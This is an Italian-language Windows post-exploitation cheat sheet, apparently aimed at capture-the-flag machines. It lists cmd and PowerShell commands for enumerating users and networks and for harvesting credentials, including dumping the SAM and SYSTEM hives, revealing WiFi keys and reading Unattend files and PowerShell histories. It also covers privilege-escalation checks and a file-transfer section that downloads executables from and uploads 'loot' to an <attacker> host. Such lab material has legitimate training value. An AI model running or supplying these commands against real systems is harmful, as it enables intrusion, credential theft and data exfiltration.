# Windows Post-Exploitation — cmd + PowerShell

Comandi utili una volta dentro una macchina Windows.
Ogni sezione ha la versione **cmd** e **PowerShell** (PS).

---

## Chi sono / Dove sono

| Cosa | cmd | PowerShell |
|---|---|---|
| Utente corrente | `whoami` | `whoami` |
| Privilegi | `whoami /priv` | `whoami /priv` |
| Gruppi | `whoami /groups` | `whoami /groups` |
| Tutto su di me | `whoami /all` | `whoami /all` |
| Hostname | `hostname` | `$env:COMPUTERNAME` |
| OS e versione | `systeminfo` | `Get-ComputerInfo \| Select OsName,OsVersion,OsBuildNumber` |
| Architettura | `echo %PROCESSOR_ARCHITECTURE%` | `[Environment]::Is64BitOperatingSystem` |
| Dominio | `echo %USERDOMAIN%` | `(Get-WmiObject Win32_ComputerSystem).Domain` |
| IP locale | `ipconfig` | `Get-NetIPAddress -AddressFamily IPv4` |

```
# One-liner rapido: chi sono, dove sono, che privilegi ho
whoami /all && hostname && ipconfig
```

---

## Enumerazione Utenti e Gruppi

| Cosa | cmd | PowerShell |
|---|---|---|
| Utenti locali | `net user` | `Get-LocalUser` |
| Info su un utente | `net user <nome>` | `Get-LocalUser <nome> \| fl *` |
| Gruppi locali | `net localgroup` | `Get-LocalGroup` |
| Membri di un gruppo | `net localgroup Administrators` | `Get-LocalGroupMember Administrators` |
| Utenti dominio | `net user /domain` | `Get-ADUser -Filter *` |
| Gruppi dominio | `net group /domain` | `Get-ADGroup -Filter *` |
| Domain Admins | `net group "Domain Admins" /domain` | `Get-ADGroupMember "Domain Admins"` |
| Policy password | `net accounts` | `Get-ADDefaultDomainPasswordPolicy` |
| Utenti loggati | `query user` | `query user` |
| Sessioni remote | `query session` | `query session` |

```
# Enum completa utenti: locali, admin, loggati
net user && echo. && net localgroup Administrators && echo. && query user
```

---

## Ricerca File

Equivalente di `find / -name "*.txt" 2>/dev/null` su Linux.

### cmd — `where` e `dir`

```batch
:: Cerca file per nome (ricorsivo da C:\)
dir /s /b C:\*password* 2>nul
dir /s /b C:\*flag* 2>nul
dir /s /b C:\*secret* 2>nul
dir /s /b C:\*credential* 2>nul
dir /s /b C:\*.kdbx 2>nul

:: Cerca per estensione
dir /s /b C:\*.txt 2>nul
dir /s /b C:\*.ini 2>nul
dir /s /b C:\*.config 2>nul
dir /s /b C:\*.xml 2>nul
dir /s /b C:\*.bak 2>nul
dir /s /b C:\*.old 2>nul
dir /s /b C:\*.log 2>nul

:: where — cerca negli ambienti PATH e sottocartelle
where /r C:\ *.txt 2>nul
where /r C:\Users *.kdbx 2>nul
```

### PowerShell — `Get-ChildItem` (gci/ls/dir)

```powershell
# Cerca file per nome (ricorsivo, errori silenziati)
gci C:\ -Recurse -Filter *password* -ErrorAction SilentlyContinue | Select FullName
gci C:\ -Recurse -Filter *flag* -ErrorAction SilentlyContinue | Select FullName
gci C:\ -Recurse -Filter *secret* -ErrorAction SilentlyContinue | Select FullName

# Cerca per estensione
gci C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml -ErrorAction SilentlyContinue | Select FullName

# File modificati di recente (ultimi 7 giorni)
gci C:\ -Recurse -ErrorAction SilentlyContinue | ? {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} | Select FullName,LastWriteTime

# File grossi (possibili dump, backup)
gci C:\ -Recurse -ErrorAction SilentlyContinue | ? {$_.Length -gt 10MB} | Select FullName,@{N='MB';E={[math]::Round($_.Length/1MB,1)}}

# File nascosti
gci C:\Users -Recurse -Force -Hidden -ErrorAction SilentlyContinue | Select FullName
```

### Posti dove cercare sempre

```batch
:: Home utenti
dir /s /b C:\Users\*password* 2>nul
dir /s /b C:\Users\*flag* 2>nul
type C:\Users\<user>\Desktop\*.txt 2>nul

:: Configurazioni web
type C:\inetpub\wwwroot\web.config 2>nul
dir /s /b C:\inetpub\*.config 2>nul

:: File di configurazione unattended (password in chiaro)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\unattended.xml 2>nul
type C:\Windows\System32\Sysprep\unattend.xml 2>nul

:: PowerShell history (spesso contiene password)
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul
```

```powershell
# PowerShell history di TUTTI gli utenti
gci C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | % { echo "=== $($_.FullName) ==="; Get-Content $_ }
```

---

## Cercare dentro i file (grep)

| Cosa | cmd | PowerShell |
|---|---|---|
| Cerca stringa in file | `findstr /si "password" *.txt *.xml *.ini` | `Select-String -Path C:\*.txt -Pattern "password" -Recurse` |
| Case insensitive | `findstr /si "pass" *.config` | `Select-String -Pattern "pass" -Path C:\*.config` |
| Regex | `findstr /r "pass.*=" *.xml` | `Select-String -Pattern "pass.*=" *.xml` |
| Ricorsivo | `findstr /s /i "password" C:\Users\*.* 2>nul` | `gci C:\Users -Recurse -Include *.txt,*.xml,*.config -EA 0 \| Select-String "password"` |

```batch
:: Cerca password in file comuni
findstr /si "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini C:\Users\*.config 2>nul
findstr /si "password" C:\inetpub\*.config 2>nul

:: Cerca stringhe di connessione DB
findstr /si "connectionString" C:\inetpub\*.config C:\*.config 2>nul
findstr /si "Server=" C:\*.config 2>nul
```

---

## Rete e Connessioni

| Cosa | cmd | PowerShell |
|---|---|---|
| Interfacce e IP | `ipconfig /all` | `Get-NetIPConfiguration` |
| Tabella ARP | `arp -a` | `Get-NetNeighbor` |
| Tabella routing | `route print` | `Get-NetRoute` |
| DNS configurato | `ipconfig /all \| findstr DNS` | `Get-DnsClientServerAddress` |
| Porte in ascolto | `netstat -ano` | `Get-NetTCPConnection -State Listen` |
| Connessioni attive | `netstat -ano \| findstr ESTABLISHED` | `Get-NetTCPConnection -State Established` |
| Share di rete | `net share` | `Get-SmbShare` |
| Share remote | `net view \\<host>` | `Get-SmbShare -CimSession <host>` |
| Drive mappati | `net use` | `Get-PSDrive -PSProvider FileSystem` |
| Firewall status | `netsh advfirewall show allprofiles` | `Get-NetFirewallProfile` |
| Regole firewall | `netsh advfirewall firewall show rule name=all` | `Get-NetFirewallRule \| ? Enabled -eq True` |
| Host nel dominio | `net view /domain` | `Get-ADComputer -Filter *` |
| DNS cache | `ipconfig /displaydns` | `Get-DnsClientCache` |
| Ping sweep | `for /l %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i \| find "Reply"` | `1..254 \| % { Test-Connection 10.10.10.$_ -Count 1 -Quiet -EA 0 }` |
| Port check | `(echo test) \| nc <host> <port>` | `Test-NetConnection <host> -Port <port>` |

```batch
:: Scopri la rete interna: IP, gateway, ARP, route, connessioni
ipconfig /all && echo. && arp -a && echo. && route print && echo. && netstat -ano | findstr LISTEN
```

---

## Sistema e Software

| Cosa | cmd | PowerShell |
|---|---|---|
| Info sistema completa | `systeminfo` | `Get-ComputerInfo` |
| Hotfix / patch | `wmic qfe list` | `Get-HotFix` |
| Patch mancanti (PE) | `systeminfo` → poi su exploit-suggester | `Get-HotFix \| Sort InstalledOn` |
| Software installato | `wmic product get name,version` | `Get-WmiObject Win32_Product \| Select Name,Version` |
| Software (registro) | `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s \| findstr "DisplayName"` | `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* \| Select DisplayName,DisplayVersion` |
| Variabili ambiente | `set` | `Get-ChildItem Env:` |
| PATH | `echo %PATH%` | `$env:PATH -split ';'` |
| Antivirus attivo | `wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName` | `Get-MpComputerStatus` |
| Windows Defender | `sc query WinDefend` | `Get-MpPreference` |
| Task schedulati | `schtasks /query /fo LIST /v` | `Get-ScheduledTask \| ? State -eq Ready` |
| Servizi | `sc query state= all` | `Get-Service` |
| Servizi non-standard | `wmic service get name,pathname \| findstr /v "C:\Windows"` | `Get-WmiObject Win32_Service \| ? {$_.PathName -notlike "C:\Windows*"} \| Select Name,PathName,StartMode` |
| Processi | `tasklist /v` | `Get-Process \| Select Name,Id,Path` |
| Disk | `wmic logicaldisk get name,size,freespace` | `Get-PSDrive -PSProvider FileSystem` |

---

## Credenziali e Secrets

### Credenziali salvate

```batch
:: Credenziali Windows salvate (Credential Manager)
cmdkey /list

:: WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

:: Autologon nel registro
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"

:: Password in Unattend / Sysprep
type C:\Windows\Panther\Unattend.xml 2>nul | findstr /i "password"
type C:\Windows\System32\Sysprep\unattend.xml 2>nul | findstr /i "password"

:: SAM e SYSTEM (copia se hai i privilegi)
reg save HKLM\SAM C:\Temp\SAM 2>nul
reg save HKLM\SYSTEM C:\Temp\SYSTEM 2>nul

:: AlwaysInstallElevated (se =1, puoi installare .msi come SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

```powershell
# Credenziali salvate in Credential Manager
Get-StoredCredential | fl *

# DPAPI — blob credenziali per utente
gci C:\Users\*\AppData\Local\Microsoft\Credentials\ -Force -EA 0
gci C:\Users\*\AppData\Roaming\Microsoft\Credentials\ -Force -EA 0

# Token / chiavi in variabili ambiente
Get-ChildItem Env: | ? { $_.Value -match "key|token|pass|secret|api" }
```

### Registro — valori interessanti

```batch
:: VNC password
reg query HKCU\Software\ORL\WinVNC3\Password 2>nul
reg query HKCU\Software\TightVNC\Server /v Password 2>nul

:: PuTTY sessioni salvate (possono avere proxy password)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>nul

:: SNMP community string
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities 2>nul
```

---

## Privilege Escalation — Quick Check

```batch
:: 1. Privilegi correnti (cerca SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore)
whoami /priv

:: 2. Servizi con path senza virgolette (unquoted service path)
wmic service get name,pathname,startmode | findstr /v "C:\Windows" | findstr /v """

:: 3. Permessi su servizi (cerca WRITE / FULL)
sc sdshow <service_name>

:: 4. Cartelle scrivibili nel PATH
for %A in ("%path:;=" "%") do @icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\"

:: 5. Task schedulati che girano come SYSTEM
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User" | findstr /i "SYSTEM"

:: 6. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

:: 7. Autorun con permessi di scrittura
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>nul
```

```powershell
# Servizi modificabili dall'utente corrente
Get-WmiObject Win32_Service | ? { $_.PathName -notlike "C:\Windows*" } | Select Name,PathName,StartMode,State

# Permessi su cartelle di servizi
Get-WmiObject Win32_Service | % { $p = ($_.PathName -split '"')[1]; if($p) { icacls $p 2>$null } }

# File con permessi Everyone/Users
gci C:\ -Recurse -EA 0 | Get-Acl -EA 0 | ? { $_.AccessToString -match "Everyone|BUILTIN\\Users" -and $_.AccessToString -match "FullControl|Modify|Write" } | Select Path
```

---

## Transfer File

```batch
:: Download con certutil
certutil -urlcache -split -f http://<attacker>/file.exe C:\Temp\file.exe

:: Download con PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker>/file.exe','C:\Temp\file.exe')"
powershell -c "Invoke-WebRequest http://<attacker>/file.exe -OutFile C:\Temp\file.exe"
powershell -c "iwr http://<attacker>/file.exe -o C:\Temp\file.exe"

:: Download con bitsadmin
bitsadmin /transfer job /download /priority high http://<attacker>/file.exe C:\Temp\file.exe

:: Upload via SMB (dall'attacker: impacket-smbserver share . -smb2support)
copy C:\Temp\loot.txt \\<attacker>\share\loot.txt

:: Upload via PowerShell
powershell -c "(New-Object Net.WebClient).UploadFile('http://<attacker>/upload','C:\Temp\loot.txt')"

:: Base64 encode/decode (quando non puoi trasferire binari)
certutil -encode file.exe file.b64
certutil -decode file.b64 file.exe
```

---

## Comandi Rapidi per Situazioni Comuni

### Ho una shell — cosa faccio per primo?

```batch
whoami /all
hostname
ipconfig /all
net user
net localgroup Administrators
systeminfo | findstr /i "OS Name OS Version Hotfix"
netstat -ano | findstr LISTEN
```

### Cerco la flag

```batch
dir /s /b C:\Users\*flag* C:\Users\*user.txt C:\Users\*root.txt 2>nul
dir /s /b C:\*flag* 2>nul
type C:\Users\<user>\Desktop\user.txt 2>nul
type C:\Users\Administrator\Desktop\root.txt 2>nul
```

### Cerco password in giro

```batch
findstr /si "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini C:\Users\*.config 2>nul
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultPassword"
```

### Mappo la rete interna

```batch
arp -a
route print
ipconfig /all | findstr /i "DNS Suffix Gateway"
net view /domain 2>nul
for /l %i in (1,1,254) do @ping -n 1 -w 100 10.10.10.%i 2>nul | find "Reply"
```
